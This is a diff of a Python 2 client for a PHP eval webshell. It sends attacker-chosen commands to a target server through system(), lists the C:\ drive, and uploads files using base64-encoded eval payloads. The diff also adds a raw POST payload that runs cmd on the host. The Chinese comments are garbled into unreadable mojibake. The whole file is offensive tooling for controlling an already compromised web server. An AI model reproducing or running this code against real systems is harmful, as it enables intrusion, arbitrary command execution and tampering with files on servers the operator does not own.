@@ -1,17 +1,17 @@
 import urllib2
 import base64
 
-url= raw_input("ip:")#ÊäÈëÁ¬½ÓµØÖ·
-key= raw_input("passwd:")#ÊäÈëÁ¬½ÓÃÜÂë
+url= raw_input("ip:")#ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Óµï¿½Ö·
+key= raw_input("passwd:")#ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
-#Ö´ÐÐÒ»²¿dirÃüÁî
+#Ö´ï¿½ï¿½Ò»ï¿½ï¿½dirï¿½ï¿½ï¿½ï¿½
 request = urllib2.Request(url,key+"=system(cd ..);", {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
 data = urllib2.urlopen(request).read()
 
 
 print data
 
-#ÊäÈëcmdÃüÁîÖ´ÐÐ
+#ï¿½ï¿½ï¿½ï¿½cmdï¿½ï¿½ï¿½ï¿½Ö´ï¿½ï¿½
 remote_server = raw_input("cmd:")
 request = urllib2.Request(url,key+"=system("+remote_server+");", {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
 data = urllib2.urlopen(request).read()
@@ -36,21 +36,35 @@ ssd="C:\\"+wb
 wb =  base64.b64encode(ssd)
 print wb
 request = urllib2.Request(url,wss+wb, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
-data = urllib2.urlopen(request).read()#²é¿´cÅÌ¸ùÄ¿Â¼
+data = urllib2.urlopen(request).read()#ï¿½é¿´cï¿½Ì¸ï¿½Ä¿Â¼
 
 print data
 
 wbwb="&admin=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D&z1="
-wb = raw_input("txt:")#ÊäÈëÉÏ´«ÎÄ±¾µÄÃû×Ö
+wb = raw_input("txt:")#ï¿½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½ï¿½Ä±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 print wb
 wb = "C:\\phpStudy\\WWW\\"+wb+".txt"
 wb =  base64.b64encode(wb)
 
 
-wbs = raw_input("cont:")#ÊäÈëÉÏ´«ÎÄ±¾µÄÄÚÈÝ
+wbs = raw_input("cont:")#ï¿½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½ï¿½Ä±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 
 request = urllib2.Request(url,wbwb+wb+"&z2="+wbs, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
-data = urllib2.urlopen(request).read()#ÉÏ´«ÎÄ±¾
+data = urllib2.urlopen(request).read()#ï¿½Ï´ï¿½ï¿½Ä±ï¿½
 
 print data
+
+
+
+
+shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=
+
+QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc
+2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRf
+ZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pO
+yRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJG
+QsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN
+9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXsk
+cmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=Y21k&z2=
+Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D
